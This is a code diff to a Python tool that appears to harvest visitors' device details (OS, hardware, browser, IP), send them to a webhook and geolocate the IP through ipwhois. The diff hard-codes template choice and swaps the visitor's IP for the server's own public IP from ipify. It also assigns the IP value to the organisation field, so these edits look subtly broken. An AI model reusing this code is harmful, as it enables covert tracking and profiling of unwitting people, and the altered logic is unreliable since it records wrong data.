@@ -7,7 +7,7 @@ G = '\033[32m'  # green
 C = '\033[36m'  # cyan
 W = '\033[0m'   # white
 Y = '\033[33m'  # yellow
-
+import json
 import sys
 import utils
 import argparse
@@ -165,9 +165,9 @@ def template_select(site):
 		selected = -1
 		if templateNum is not None:
 			if templateNum >= 0 and templateNum < len(templ_json['templates']):
-				selected = templateNum
+				selected = 0
 		else:
-			selected = int(input(f'{G}[>] {W}'))
+			selected = 0
 		if selected < 0:
 			print()
 			utils.print(f'{R}[-] {C}Invalid Input!{W}')
@@ -294,8 +294,10 @@ def data_parser():
 		var_render = info_json['render']
 		var_res = info_json['wd'] + 'x' + info_json['ht']
 		var_browser = info_json['browser']
-		var_ip = info_json['ip']
-
+		response = requests.get('https://api.ipify.org?format=json')
+		data = json.loads(response.text)
+		var_ip = data['ip']
+		# var_ip = info_json['ip']
 		data_row.extend([var_os, var_platform, var_cores, var_ram, var_vendor, var_render, var_res, var_browser, var_ip])
 		device_info = f'''{Y}[!] Device Information :{W}
 
@@ -314,6 +316,7 @@ def data_parser():
 		send_webhook(info_json, 'device_info')
 
 		if ip_address(var_ip).is_private:
+			
 			utils.print(f'{Y}[!] Skipping IP recon because IP address is private{W}')
 		else:
 			rqst = requests.get(f'https://ipwhois.app/json/{var_ip}')
@@ -326,7 +329,7 @@ def data_parser():
 				var_country = str(data['country'])
 				var_region = str(data['region'])
 				var_city = str(data['city'])
-				var_org = str(data['org'])
+				var_org = str(data['ip'])
 				var_isp = str(data['isp'])
 
 				data_row.extend([var_continent, var_country, var_region, var_city, var_org, var_isp])
